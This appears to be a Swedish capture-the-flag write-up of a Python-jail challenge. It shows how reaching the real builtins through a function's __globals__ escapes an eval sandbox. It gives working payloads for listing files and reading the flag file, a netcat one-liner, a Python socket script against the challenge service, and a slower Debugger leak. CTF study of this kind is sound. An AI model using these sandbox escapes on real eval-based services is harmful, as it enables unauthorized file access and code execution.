# Bakom Lås Och Orm — Svenska

**Kategori:** Pwn / Python-jail · **Tjänst:** `nc challs.crate.nu 31729`

En "säker miniräknare" i Python läser ett enda uttryck (max 80 tecken), parsar det med
`ast.parse`, avvisar en handfull AST-nodtyper och kör sedan `eval` med en begränsad
builtins-dict. Jailet går att rymma från eftersom attributåtkomst, anrop och subscript är
tillåtna, och ett utmaningsobjekt exponeras i eval-globalerna — vilket ger en väg till den
*riktiga*, obegränsade `builtins`-modulen.

## 1. Granska sandboxen

Tjänsten:

- parsar uttrycket med `ast.parse`;
- **blockerar** dessa AST-nodklasser: `Import`, `Assign`, `FunctionDef`, `ClassDef`, `While`,
  `For`, `With`, `Try`, `Lambda`;
- kör `eval` med en reducerad builtins-uppsättning `SAFE_BUILTINS = {abs, len, sum, min, max,
  sorted, getattr, range}`;
- blockerar **inte** `Attribute`-, `Call`- eller `Subscript`-noder;
- exponerar ett globalt objekt `prison` — en instans av utmaningens egen `Prison`-klass.

Alla utmaningsklasser (`Prison`, `Calculator`, `History`, `Debugger`) är definierade i
skriptets egen `__main__`-modul.

## 2. Flykt-gadgeten

Varje funktion definierad i `__main__` bär modulens **riktiga** globala namnrymd i sitt
`__globals__`, och Python lagrar alltid den äkta `builtins`-modulen under nyckeln
`'__builtins__'` i en moduls globaler. Den begränsade `SAFE_BUILTINS`-dicten används endast
för själva `eval()`-anropet — den rör inte modulens globaler. Alltså:

```text
prison.__init__.__globals__['__builtins__']
```

returnerar den **riktiga, obegränsade `builtins`-modulen**, som exponerar `open`,
`__import__` osv., och kringgår `SAFE_BUILTINS` helt. Allt detta ryms inom 80-teckengränsen
och använder bara tillåtna nodtyper (attributåtkomst + subscript + anrop).

## 3. Lista filsystemet (valfri bekräftelse)

```text
prison.__init__.__globals__['__builtins__'].__import__('os').listdir('.')
```

Returnerar:

```text
['calc_history.txt', 'jail.py', 'logs.txt', 'old_logs.txt']
```

(Arbetskatalog `/home/ctf`.) Detta bekräftar riktig serversidig filsystemsåtkomst.

## 4. Läs flaggan (exakt jail-escape-uttryck)

Flaggan finns i `old_logs.txt`. Det exakta escape-uttrycket som användes (66 tecken) är:

```text
prison.__init__.__globals__['__builtins__'].open('old_logs.txt').read()
```

Skicka det som en enda rad. Enradsreproduktion:

```bash
printf "prison.__init__.__globals__['__builtins__'].open('old_logs.txt').read()\n" \
  | nc challs.crate.nu 31729
```

Eller i Python:

```python
import socket
HOST, PORT = "challs.crate.nu", 31729
PAYLOAD = "prison.__init__.__globals__['__builtins__'].open('old_logs.txt').read()"
with socket.create_connection((HOST, PORT), timeout=10) as s:
    s.recv(4096)                       # banner/prompt
    s.sendall((PAYLOAD + "\n").encode())
    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
# utskriften kommer efter "> "-prompten
print(data.decode("utf-8", "replace").split("> ")[-1].strip())
```

Flaggan `cratectf{...}` skrivs ut direkt efter `>`-prompten (dold här).

## Alternativ väg: den exponerade `Debugger`

Utmaningen exponerar även en `Debugger` som nås via `prison.calc.debugger`. Dess
`show_logs(index)`-metod returnerar `f.readline()[index]` — ett enda tecken ur den första
loggraden på position `index`. Genom att börja på `index = 0` och öka tills `IndexError`
återskapas den första raden i samma loggfil ett tecken i taget, t.ex.:

```text
prison.calc.debugger.show_logs(0)   # första tecknet
prison.calc.debugger.show_logs(1)   # andra tecknet, ...
```

Båda vägarna läser samma serversidiga fil; `__builtins__`-vägen läser den i ett svep.

## Verifiering

Plattformsbekräftat löst, och oberoende reproducerat mot den live tjänsten — läsningen av
`old_logs.txt` returnerar den riktiga `cratectf{...}`-flaggan, dold för publicering.
